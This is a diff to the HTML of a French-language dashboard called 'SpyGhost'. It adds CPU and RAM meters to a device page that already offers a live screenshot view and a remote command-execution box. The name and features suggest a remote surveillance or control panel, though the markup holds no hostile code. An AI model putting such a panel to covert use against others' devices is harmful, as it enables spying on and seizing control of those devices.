@@ -10,9 +10,9 @@
 
 <body>
     <div class="navbar">
-        <img src="SpyGhost_icon.png" alt="SpyGhost official icon" width="41.6" height="41.6"/>
+        <img src="SpyGhost_icon.png" alt="Logo de l'application" height="41.6" width="41.6">
         <input type="text" placeholder="Rechercher un appareil...">
-        <div class="client-count"> En ligne : <span id="connected-count">0</span> / Hors ligne : <span id="disconnected-count">0</span></div>
+        <div class="client-count">Connectés: <span id="connected-count">0</span> / Non Connectés: <span id="disconnected-count">0</span></div>
         <button id="api-button">API</button>
         <button id="settings-button">Settings</button>
     </div>
@@ -21,18 +21,41 @@
         </div>
 
     <div class="device-page" id="device-page" style="display: none;">
-        <h2> Surveillance de l'appareil <span id="device-name-header"></span></h2>
+        <h2>Surveillance de l'appareil <span id="device-name-header"></span></h2>
+        
+        <!-- Section des ressources système -->
+        <div class="resources-area">
+            <h3>Ressources système</h3>
+            <div class="resource-metrics">
+                <div class="resource-metric">
+                    <h4>CPU</h4>
+                    <div class="progress-bar">
+                        <div id="cpu-progress" class="progress-fill"></div>
+                    </div>
+                    <span id="cpu-usage-text">0%</span>
+                    <span id="cpu-alert" class="alert-text"></span>
+                </div>
+                <div class="resource-metric">
+                    <h4>RAM</h4>
+                    <div class="progress-bar">
+                        <div id="ram-progress" class="progress-fill"></div>
+                    </div>
+                    <span id="ram-usage-text">0 GB / 0 GB (0%)</span>
+                    <span id="ram-alert" class="alert-text"></span>
+                </div>
+            </div>
+        </div>
+        
         <div class="screenshot-area">
             <h3>Screenshot en direct</h3>
             <img id="screenshot-display" src="" alt="Screenshot de l'appareil">
         </div>
         <div class="command-area">
             <h3>Exécuter une commande</h3>
-            <input type="text" id="command-input" placeholder="Taper une commande">
-            <button id="execute-command-button"> Exécuter </button>
-            <div id="command-output"></div>
+            <input type="text" id="command-input" placeholder="Commande à exécuter">
+            <button id="execute-command-button">Exécuter</button>
+            <div id="command-output" class="command-output"></div>
         </div>
-        <button id="back-to-list-button"> Retour à la liste des appareils </button>
+        <button id="back-to-list-button">Retour à la liste des appareils</button>
     </div>
-</body>
 </html>
